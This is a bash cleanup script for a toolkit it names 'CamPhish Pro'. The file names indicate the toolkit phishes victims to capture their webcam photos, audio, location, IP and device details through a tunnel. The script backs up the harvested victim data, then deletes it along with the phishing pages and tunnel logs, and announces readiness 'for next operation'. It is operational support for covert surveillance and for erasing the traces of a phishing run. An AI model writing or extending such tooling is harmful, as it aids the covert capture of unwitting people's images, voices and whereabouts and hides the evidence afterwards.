#!/bin/bash
# Enhanced Cleanup Script for CamPhish Pro
# Professional cleanup with backup options

echo "🔧 CamPhish Pro - Enhanced Cleanup System"
echo "=========================================="

# Safety confirmation
read -p "Are you sure you want to cleanup? (y/N): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "❌ Cleanup cancelled."
    exit 1
fi

# Create backup directory
BACKUP_DIR="backup_$(date +%Y%m%d_%H%M%S)"
echo "📦 Creating backup in: $BACKUP_DIR"
mkdir -p "$BACKUP_DIR"

# Backup important data
echo "💾 Backing up data..."
if [ -d "photos" ]; then
    mkdir -p "$BACKUP_DIR/photos"
    cp -r photos/* "$BACKUP_DIR/photos/" 2>/dev/null
    echo "✓ Photos backed up"
fi

if [ -d "audio" ]; then
    mkdir -p "$BACKUP_DIR/audio"
    cp -r audio/* "$BACKUP_DIR/audio/" 2>/dev/null
    echo "✓ Audio files backed up"
fi

if [ -f "all_data.log" ]; then
    cp all_data.log "$BACKUP_DIR/" 2>/dev/null
    echo "✓ Data logs backed up"
fi

if [ -f "photo_log.txt" ]; then
    cp photo_log.txt "$BACKUP_DIR/" 2>/dev/null
    echo "✓ Photo logs backed up"
fi

if [ -f "audio_log.txt" ]; then
    cp audio_log.txt "$BACKUP_DIR/" 2>/dev/null
    echo "✓ Audio logs backed up"
fi

# Backup data files
if ls data_*.json 1> /dev/null 2>&1; then
    cp data_*.json "$BACKUP_DIR/" 2>/dev/null
    echo "✓ Data files backed up"
fi

echo "🗑️  Cleaning up files and directories..."

# Remove directories
DIRS=("photos" "audio" "saved_locations")
for dir in "${DIRS[@]}"; do
    if [ -d "$dir" ]; then
        rm -rf "$dir"
        echo "✓ Removed directory: $dir"
    fi
done

# Remove log files
echo "📄 Cleaning log files..."
LOGS=("*.log" "*.txt" "Log.log" "LocationLog.log" "LocationError.log" "photo_log.txt" "audio_log.txt" "all_data.log" ".cloudflared.log")
for log in "${LOGS[@]}"; do
    find . -maxdepth 1 -name "$log" -type f -delete 2>/dev/null
    echo "✓ Cleaned: $log"
done

# Remove temporary files
echo "📝 Cleaning temporary files..."
TEMPFILES=("index.php" "index2.html" "index3.html" "ip.txt" "location_*.txt" "current_location.*" "current_location.bak")
for temp in "${TEMPFILES[@]}"; do
    find . -maxdepth 1 -name "$temp" -type f -delete 2>/dev/null
    echo "✓ Removed: $temp"
done

# Remove data files
echo "🗃️  Cleaning data files..."
DATAFILES=("data_*.json" "device_info_*.txt" "location_data_*.txt")
for data in "${DATAFILES[@]}"; do
    find . -maxdepth 1 -name "$data" -type f -delete 2>/dev/null
    echo "✓ Removed: $data"
done

# Remove any cam photos in root directory
echo "📸 Cleaning photo files..."
find . -maxdepth 1 -name "cam*.png" -type f -delete 2>/dev/null
find . -maxdepth 1 -name "front_*.png" -type f -delete 2>/dev/null
find . -maxdepth 1 -name "back_*.png" -type f -delete 2>/dev/null
echo "✓ Removed photo files"

echo "✅ Cleanup completed successfully!"
echo "📊 Backup created in: $BACKUP_DIR"

# Show backup size
if [ -d "$BACKUP_DIR" ]; then
    echo "💽 Backup size: $(du -sh "$BACKUP_DIR" 2>/dev/null | cut -f1)"
fi

# Optional: Remove backup
read -p "Delete backup as well? (y/N): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    rm -rf "$BACKUP_DIR"
    echo "✓ Backup deleted"
else
    echo "✓ Backup preserved in: $BACKUP_DIR"
fi

echo "🎯 System is clean and ready for next operation!"